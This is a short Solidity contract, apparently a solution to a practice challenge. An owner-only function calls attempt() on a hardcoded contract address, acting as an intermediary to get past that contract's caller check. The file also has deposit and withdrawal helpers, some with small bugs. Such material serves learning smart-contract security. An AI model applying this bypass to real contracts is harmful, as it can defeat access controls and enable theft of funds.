// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract SmartContractAttacker2 {

    address payable public owner;

    address public SCWAddress = 0xcF469d3BEB3Fc24cEe979eFf83BE33ed50988502;

    uint256 public accountbalance;

    constructor () payable {
        owner = payable(msg.sender);
        accountbalance += msg.value;
    }

    event Withdrawal(uint amount, uint when);

    modifier onlyOwner() {
        require(owner == msg.sender, "Only owner can all this function");
        _;
    }

    function hackWinner() public onlyOwner {
         (bool s, ) = SCWAddress.call(abi.encodeWithSignature("attempt()"));
         require(s);
    }

    function deposit() public payable {
        accountbalance += msg.value;
    }

    function deposit2(uint _amount) public payable {
        require(msg.value == _amount);
        accountbalance += _amount;
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function geContracttBalance2() public view returns (uint) {
        return accountbalance;
    }
    

    function ownerWithdraw() public payable onlyOwner {
        accountbalance -= msg.value;
        (bool success, ) = payable(owner).call{ value: address(this).balance }("");
        require(success);
        emit Withdrawal(address(this).balance, block.timestamp);
    }

    receive() external payable {
        accountbalance += msg.value;
    }
}




